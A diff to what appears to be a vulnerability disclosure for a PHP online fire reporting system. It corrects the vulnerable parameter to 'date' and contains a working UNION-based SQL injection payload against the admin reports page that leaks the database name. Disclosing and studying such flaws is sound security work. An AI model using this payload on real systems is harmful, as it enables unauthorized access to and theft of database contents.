@@ -4,7 +4,7 @@ vendors: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-p
 
 Vulnerability File: /ofrs/admin/?page=reports&date=
 
-Vulnerability location: /ofrs/admin/?page=reports&date=, id
+Vulnerability location: /ofrs/admin/?page=reports&date=, date
 
 [+] Payload: /ofrs/admin/?page=reports&date=2022-05-27%27%20union%20select%201,2,3,database(),5,6,7,8,9,10--+ // Leak place ---> date
 
